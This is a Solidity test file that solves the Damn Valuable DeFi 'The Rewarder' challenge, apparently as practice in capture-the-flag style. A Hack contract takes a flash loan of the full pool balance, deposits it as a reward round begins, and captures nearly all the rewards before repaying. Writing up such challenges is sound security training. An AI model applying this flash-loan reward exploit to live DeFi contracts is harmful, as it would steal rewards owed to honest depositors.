// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/the-rewarder/FlashLoanerPool.sol";
import "../../src/the-rewarder/TheRewarderPool.sol";
import "../../src/the-rewarder/RewardToken.sol";
import "../../src/the-rewarder/AccountingToken.sol";
import "../../src/DamnValuableToken.sol";

import "openzeppelin-contracts/utils/Address.sol";

contract TheRewarderTest is BaseTest {
    uint TOKENS_IN_LENDER_POOL = 1000000 ether;

    DamnValuableToken liquidityToken;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    AccountingToken accountingToken;

    address attacker;
    address alice;
    address bob;
    address charlie;
    address david;

    constructor() {
        string[] memory labels = new string[](5);
        labels[0] = "Attacker";
        labels[1] = "Alice";
        labels[2] = "Bob";
        labels[3] = "Charlie";
        labels[4] = "David";

        preSetup(5, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        liquidityToken = new DamnValuableToken();
        vm.label(address(liquidityToken), "DamnValuableToken");

        flashLoanPool = new FlashLoanerPool(address(liquidityToken));
        vm.label(address(liquidityToken), "FlashLoanerPool");

        // Set initial token balance of the pool offering flash loans
        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);
        // await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accToken();

        // Alice, Bob, Charlie and David deposit 100 tokens each
        // start from 1 because 0 is the attacker
        for (uint256 i = 1; i < users.length; i++) {
            uint256 amount = 100 ether;
            liquidityToken.transfer(users[i], amount);

            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), amount);
            rewarderPool.deposit(amount);
            vm.stopPrank();

            assertEq(accountingToken.balanceOf(users[i]), amount);
        }

        assertEq(accountingToken.totalSupply(), 400 ether);
        assertEq(rewardToken.totalSupply(), 0 ether);

        // Advance time 5 days so that depositors can get rewards
        utils.mineTime(5 days);

        // Each depositor gets 25 reward tokens
        // start from 1 because 0 is the attacker
        for (uint256 i = 1; i < users.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            assertEq(rewardToken.balanceOf(users[i]), 25 ether);
        }

        assertEq(rewardToken.totalSupply(), 100 ether);

        // Attacker starts with zero DVT tokens in balance
        assertEq(liquidityToken.balanceOf(attacker), 0 ether);

        assertEq(rewarderPool.roundNumber(), 2);
    }

    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        // Advance time 5 days so that depositors can get rewards
        utils.mineTime(5 days);

        // deploy the exploit contract
        vm.startPrank(attacker);
        Hack hack = new Hack(
            address(liquidityToken),
            address(flashLoanPool),
            address(rewarderPool),
            address(rewardToken)
        );
        hack.attack();
        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        // Only one round should have taken place
        assertEq(rewarderPool.roundNumber(), 3);

        // Users should get neglegible rewards this round
        // start from 1 because 0 is the attacker
        for (uint256 i = 1; i < users.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();

            uint256 rewards = rewardToken.balanceOf(users[i]);

            // The difference between current and previous rewards balance should be lower than 0.01 tokens [ethers.utils.parseUnits('1', 16)]
            uint256 delta = rewards - 25 ether;
            assertLt(delta, 0.01 ether);
        }

        // Rewards must have been issued to the attacker account
        assertGt(rewardToken.totalSupply(), 100 ether);
        uint256 rewardsAttacker = rewardToken.balanceOf(attacker);

        // The amount of rewards earned should be really close to 100 tokens [ethers.utils.parseUnits('1', 17)]
        uint256 deltaAttacker = 100 ether - rewardsAttacker;
        assertLt(deltaAttacker, 0.1 ether);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(liquidityToken.balanceOf(attacker), 0);
    }
}

contract Hack {
    address public liquidityTokenAddr;
    address public flashLoanerPoolAddr;
    address public rewarderPoolAddr;
    address public rewardTokenAddr;

    address public attacker;

    constructor(
        address _liquidityTokenAddr,
        address _flashLoanerPoolAddr,
        address _rewarderPoolAddr,
        address _rewardTokenAddr
    ) {
        attacker = msg.sender;
        liquidityTokenAddr = _liquidityTokenAddr;
        flashLoanerPoolAddr = _flashLoanerPoolAddr;
        rewarderPoolAddr = _rewarderPoolAddr;
        rewardTokenAddr = _rewardTokenAddr;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == flashLoanerPoolAddr);

        DamnValuableToken liquidityToken = DamnValuableToken(
            liquidityTokenAddr
        );
        TheRewarderPool rewarderPool = TheRewarderPool(rewarderPoolAddr);
        RewardToken rewardToken = RewardToken(rewardTokenAddr);

        liquidityToken.approve(rewarderPoolAddr, borrowAmount);
        rewarderPool.deposit(borrowAmount);
        rewarderPool.withdraw(borrowAmount);

        bool payedBorrow = liquidityToken.transfer(
            flashLoanerPoolAddr,
            borrowAmount
        );
        require(payedBorrow);

        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(attacker, rewardBalance);
        require(rewardSent);
    }

    function attack() public {
        require(msg.sender == attacker);

        uint256 dvtPoolBalance = DamnValuableToken(liquidityTokenAddr)
            .balanceOf(flashLoanerPoolAddr);
        FlashLoanerPool(flashLoanerPoolAddr).flashLoan(dvtPoolBalance);
    }
}
